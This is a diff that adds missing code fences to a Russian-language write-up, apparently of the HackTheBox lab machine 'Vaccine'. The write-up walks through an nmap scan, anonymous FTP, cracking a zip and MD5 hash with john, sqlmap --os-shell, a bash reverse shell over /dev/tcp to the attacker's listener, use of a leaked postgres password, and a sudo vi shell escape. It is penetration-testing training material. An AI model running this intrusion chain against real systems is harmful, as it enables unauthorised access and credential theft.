@@ -14,6 +14,7 @@
 
 ```bash
 nmap -sV 10.129.209.236
+```
 
 ### Результат
 
@@ -39,6 +40,7 @@ PORT   STATE    SERVICE VERSION
 
 ```bash
 ftp 10.129.209.236
+```
 
 Подключаемся с помощью логина `anonymous`.
 Просмотр директории:
@@ -59,19 +61,23 @@ ftp> get backup.zip
 Файл зашифрован, извлекаем хэш:
 ```bash
 zip2john backup.zip > zip_hash.txt
+```
 
 Взламываем хэш с помощью john:
 ```bash
 john --wordlist=/usr/share/wordlists/rockyou.txt zip_hash.txt
 741852963        (backup.zip)
+```
 
 Разархивируем скачанный архив с помощью найденного пароля и открываем файл index.php, нас интересует строчка:
 ```php
 if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
+```
 
 Указан хэш пароля и тип шифрования, взламываем с помощью john:
 ```bash
 john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
+```
 Ответ: qwerty789
 
 ## Эксплуатация уязвимости (Exploitation)
@@ -85,15 +91,15 @@ john --format=Raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt md5.txt
 Устанавливаем на прослушивание 444 порт на атакующей машине:
 ```bash
 nc -lvnp 444
-
+```
 С помощью sqlmap запускаем shell:
 ```bash
 sqlmap -u "http://10.129.95.174/dashboard.php?search=1" --cookie="PHPSESSID=ji4lr6ibdfcfna11fbpe4qsurs" --os-shell
-
+```
 Вводим скрипт для перехвата атакующей машиной:
 ```bash
 bash -c "bash -i >& /dev/tcp/ip атакующей машины/444 0>&1"
-
+```
 Переводим шелл из неинтерактивного режима в интерактивный:
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
@@ -101,13 +107,13 @@ CTRL+Z
 stty raw -echo
 fg
 export TERM=xterm
-
+```
 Теперь мы можем найти флаг в папке пользователя. Файл с флагом лежит по пути: /var/lib/postgresql/user.txt
 
 Файл с паролем от postgres находится в каталоге /var/www/html/dashboard.php:
 ```php
 $conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
-
+```
 Теперь можно заходить по SSH под пользователем postgres:
 Вводим команду sudo -l и узнаем, какую программу postgres может запускать с повышенными правами:
 
@@ -123,7 +129,7 @@ User postgres may run the following commands on vaccine:
 Устанавливаем размеры терминала для корректного отображения:
 ```bash
 stty rows 24 cols 80
-
+```
 В открытом файле /etc/postgresql/11/main/pg_hba.conf в редакторе vi вводим:
 set shell=/bin/sh
 shell
